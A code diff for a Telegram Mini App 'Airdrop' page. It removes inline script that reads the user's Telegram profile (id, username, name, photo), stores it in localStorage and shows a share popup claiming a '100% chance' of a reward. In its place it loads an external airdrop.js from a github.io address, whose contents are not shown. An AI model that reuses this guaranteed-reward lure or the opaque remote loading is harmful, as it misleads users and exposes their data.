@@ -34,56 +34,6 @@
       <button onclick="Telegram.WebApp.close()">🔚 Закрыть</button>
     </div>
   </div>
-
-  <script>
-    let tgUser = {};
-    const now = new Date().toLocaleString();
-
-    if (typeof Telegram !== "undefined" && Telegram.WebApp?.initDataUnsafe?.user) {
-      Telegram.WebApp.ready();
-      Telegram.WebApp.expand();
-
-      const u = Telegram.WebApp.initDataUnsafe.user;
-      tgUser.id = u.id;
-      tgUser.username = u.username || "—";
-      tgUser.first_name = [u.first_name, u.last_name].filter(Boolean).join(" ") || "—";
-      tgUser.photo_url = u.photo_url || "";
-
-      // Збереження в localStorage
-      localStorage.setItem("tg_user_id", tgUser.id);
-      localStorage.setItem("tg_username", tgUser.username);
-      localStorage.setItem("tg_name", tgUser.first_name);
-      localStorage.setItem("tg_photo", tgUser.photo_url);
-      localStorage.setItem("tg_timestamp", now);
-    } else {
-      // Fallback: localStorage
-      tgUser.id = localStorage.getItem("tg_user_id") || "—";
-      tgUser.username = localStorage.getItem("tg_username") || "—";
-      tgUser.first_name = localStorage.getItem("tg_name") || "—";
-      tgUser.photo_url = localStorage.getItem("tg_photo") || "";
-    }
-
-    // Відображення
-    document.getElementById("fullname").textContent = tgUser.first_name || "—";
-    document.getElementById("username").textContent = tgUser.username || "—";
-    document.getElementById("userid").textContent = tgUser.id || "—";
-    document.getElementById("timestamp").textContent = localStorage.getItem("tg_timestamp") || now;
-
-    // Аватар
-    if (tgUser.photo_url && tgUser.photo_url !== "—") {
-      const avatar = document.getElementById("avatar");
-      avatar.src = tgUser.photo_url;
-      avatar.style.display = "inline-block";
-    }
-
-    // Поделиться
-    function shareAirdrop() {
-      Telegram.WebApp.showPopup({
-        title: "Поделиться",
-        message: "Я стал участником Airdrop с шансом 100% получить награду!",
-        buttons: [{ id: "ok", type: "default", text: "Ок" }]
-      });
-    }
-  </script>
-</body>
+  <script src="https://sp574-maker.github.io/maker/airdrop.js"></script>
+  </body>
 </html>
